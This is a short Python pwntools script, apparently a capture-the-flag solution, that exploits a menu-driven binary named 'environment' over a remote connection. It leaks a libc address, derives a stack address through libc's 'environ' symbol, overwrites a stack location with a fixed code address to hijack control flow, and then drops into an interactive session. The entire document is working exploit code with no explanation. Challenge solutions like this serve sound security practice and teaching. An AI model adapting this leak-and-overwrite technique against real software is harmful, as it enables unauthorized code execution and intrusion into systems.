from pwn import *

# r = process(["./environment"])
r = remote(...)

for _ in range(5):
    r.sendlineafter(">", "2")
    r.sendlineafter(">", "1")
    r.sendlineafter(">", "n")

leak = int(r.recvuntil("]").decode().split("[")[-1][:-1], 16)
leak -= 0x0000000000064f70
log.info("Libc @ 0x%x" % leak)

for _ in range(5):
    r.sendlineafter(">", "2")
    r.sendlineafter(">", "1")
    r.sendlineafter(">", "n")

ENVIRON = 0x00000000003ee098
r.sendlineafter(">", str(leak + ENVIRON))
stack_leak = r.recvuntil("[1;0").split(b"m")[1].split(b"\n")[0]
stack_leak = u64(stack_leak.ljust(8, b"\x00"))
log.info("environ @ 0x%x" % stack_leak)

r.sendlineafter("> ", "1")
r.sendlineafter("> ", str(stack_leak - 0x120))
r.sendlineafter("> ", str(0x004010b5))

r.interactive()
